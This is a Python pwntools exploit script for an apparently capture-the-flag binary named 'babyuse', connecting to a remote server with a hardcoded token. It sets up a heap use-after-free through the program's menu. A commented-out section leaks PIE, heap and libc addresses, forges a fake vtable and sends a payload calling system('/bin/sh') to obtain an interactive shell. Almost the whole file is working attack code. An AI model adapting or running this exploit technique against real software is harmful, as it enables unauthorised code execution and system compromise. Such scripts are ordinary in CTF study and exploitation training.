#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys
#r = process("./babyuse")
token = '4e4ARInVS102IeYFkmUlBUVjOojxsMKC'
r = remote('202.112.51.247', 3456)
context(log_level='DEBUG')
def ru(delim):
    return r.recvuntil(delim)
def rn(c):
    return r.recvn(c)
def sn(d):
    return r.send(d)
def sl(d):
    return r.sendline(d)
def menu():
    return ru('Exit\n')
def buy(index, length, name):
    menu()
    sl('1')
    ru('add:')
    sl(str(index))
    ru('name')
    sl(str(length))
    ru('name:')
    sn(name)
    return 
def select(index):
    menu()
    sl('2')
    ru('gun')
    sl(str(index))
    return
def list():
    menu()
    sl('3')
    return
def rename(index, length, name):
    menu()
    sl('4')
    ru('rename')
    sl(str(index))
    ru('name')
    sl(str(length))
    ru('name:')
    sn(name)
    return
def use(ops):
    menu()
    sl('5')
    for c in ops:
        sl(str(c))
    return
def drop(index):
    menu()
    sl('6')
    ru('delete:')
    sl(str(index))
    return 
def main():
    #gdb.attach(r)
    ru('Token:')
    sl(token)
    buy(1, 215-8, 'A'*(215-8))
    buy(1, 31, 'A'*31)
    buy(1, 31, 'A'*31)
    buy(1, 31, 'A'*31)
    select(2)
    drop(2)
    rename(3, 15, 'AAAA\n')
    menu()
    # sl('5')
    # ru('Select gun ')
    # pie = u32(rn(4)) - 0x1d30
    # log.info('pie = ' + hex(pie))
    # heap = u32(rn(4))
    # log.info('heap_leak = ' + hex(heap))
    # sl('4')
    # buy(1, 31, 'A'*31)
    # drop(2)
    # fake_vtable = heap + 192
    # rename(1, 63, p32(pie+0x172e).ljust(63, 'A'))
    # rename(3, 15, p32(fake_vtable) + p32(pie + 0x3fd0) + '\n')
    # menu()
    # sl('5')
    # ru('Select gun ')
    # addr = u32(rn(4)) - 0x712f0
    # system = addr + 0x3ada0
    # binsh = addr + 0x15b82b
    # info("libc = " + hex(addr))
    # payload = '1 '.ljust(12)
    # payload += p32(system)
    # payload += p32(0xdeadbeef)
    # payload += p32(binsh)
    # sl(payload)
    r.interactive()
    return
if __name__ == '__main__':
    main()